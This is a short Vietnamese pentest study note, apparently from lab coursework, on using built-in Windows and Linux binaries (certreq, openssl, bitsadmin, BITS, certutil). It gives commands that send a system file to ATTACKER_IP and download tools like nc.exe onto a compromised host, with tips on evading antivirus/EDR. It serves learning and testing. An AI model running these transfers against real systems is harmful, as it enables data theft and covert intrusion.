# Living Off The Land

## Ý chính

Living off the Land là kỹ thuật dùng binary/tool hợp pháp có sẵn trên hệ điều hành để thực hiện các tác vụ pentest như:

- Download file
- Upload file
- Command execution
- File read
- File write
- Bypass

Các binary này gọi là LOLBins.

## Nguồn tra cứu quan trọng

- LOLBAS: dành cho Windows binaries
- GTFOBins: dành cho Linux binaries

## Khi nào cần dùng Living off the Land?

Dùng khi:

- Không có `wget`, `curl`, `nc`
- Không upload được tool
- Antivirus/EDR chặn tool lạ
- Cần dùng binary hợp pháp có sẵn trên hệ thống
- Cần giảm độ ồn trong quá trình pentest

## Windows - CertReq upload file

Trên attacker/Pwnbox mở Netcat:

```bash
sudo nc -lvnp 8000
```
Trên Windows victim:

```
certreq.exe -Post -config http://ATTACKER_IP:8000/ c:\windows\win.ini
```

Nội dung file sẽ được gửi về Netcat listener qua HTTP POST.

## Linux - OpenSSL transfer file

Tạo certificate trên Pwnbox:

```
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

Chạy server gửi file:

```
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Trên compromised machine tải file:

```
openssl s_client -connect ATTACKER_IP:80 -quiet > LinEnum.sh
```

## Windows - Bitsadmin download

```
bitsadmin /transfer wcb /priority foreground http://ATTACKER_IP:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

## Windows - PowerShell BITS

```
Import-Module bitstransfer; Start-BitsTransfer -Source "http://ATTACKER_IP:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

## Windows - Certutil download

```
certutil.exe -verifyctl -split -f http://ATTACKER_IP:8000/nc.exe
```

## Ghi nhớ

- LOLBAS dùng cho Windows.
- GTFOBins dùng cho Linux.
- Living off the Land giúp tận dụng tool có sẵn.
- Certutil download khá nổi tiếng, dễ bị Defender/EDR phát hiện.
- Nên có nhiều phương án transfer file khác nhau trong note pentest.